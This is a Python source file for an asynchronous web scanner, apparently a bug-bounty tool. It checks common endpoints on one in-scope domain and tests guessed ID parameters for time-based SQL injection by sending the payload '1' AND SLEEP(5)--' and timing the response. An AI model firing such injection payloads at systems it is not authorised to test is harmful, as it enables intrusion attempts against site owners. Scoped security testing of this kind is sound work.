import aiohttp
import asyncio
import time
from urllib.parse import urljoin, urlparse

COMMON_ENDPOINTS = [
    "/",
    "/api/user",
    "/api/profile",
    "/admin",
    "/dashboard"
]

COMMON_PARAMS = ["id", "user_id", "uid", "account"]


class SovereignBBEngine:
    def __init__(self, base_scope, concurrency=20):
        self.base_scope = self._normalize_scope(base_scope)
        self.base_domain = urlparse(self.base_scope).netloc
        self.semaphore = asyncio.Semaphore(concurrency)

    # ---------------- Scope Enforcement ----------------

    def _normalize_scope(self, url):
        if not url.startswith(("http://", "https://")):
            raise ValueError("Scope must start with http:// or https://")
        return url.rstrip("/")

    def in_scope(self, url):
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        if parsed.netloc != self.base_domain:
            return False
        return True

    # ---------------- Main Pipeline ----------------

    async def run(self):
        discoveries = await self.discover()
        results = []

        for finding in discoveries:
            valid, evidence = await self.validate(finding)
            if not valid:
                continue

            impact = self.classify_impact(finding)
            if not impact:
                continue

            finding["impact"] = impact
            finding["evidence"] = evidence
            results.append(finding)

        return results

    async def discover(self):
        findings = []

        async with aiohttp.ClientSession() as session:
            for ep in COMMON_ENDPOINTS:
                url = urljoin(self.base_scope + "/", ep)

                if not self.in_scope(url):
                    continue

                async with self.semaphore:
                    try:
                        async with session.get(url, timeout=10) as r:
                            if r.status in (200, 401, 403):
                                for p in COMMON_PARAMS:
                                    findings.append({
                                        "url": url,
                                        "param": p,
                                        "type": "TIME_BASED_SQLI"
                                    })
                    except Exception:
                        continue

        return findings

    async def validate(self, finding):
        payload = "1' AND SLEEP(5)--"
        params = {finding["param"]: payload}

        async with aiohttp.ClientSession() as session:
            start = time.time()
            try:
                async with session.get(
                    finding["url"],
                    params=params,
                    timeout=10
                ):
                    pass
            except Exception:
                return False, None

        delay = time.time() - start
        if delay >= 4.5:
            return True, {"delay": round(delay, 2)}

        return False, None

    def classify_impact(self, finding):
        if finding["type"] == "TIME_BASED_SQLI":
            return "Time-Based SQL Injection"
        return None
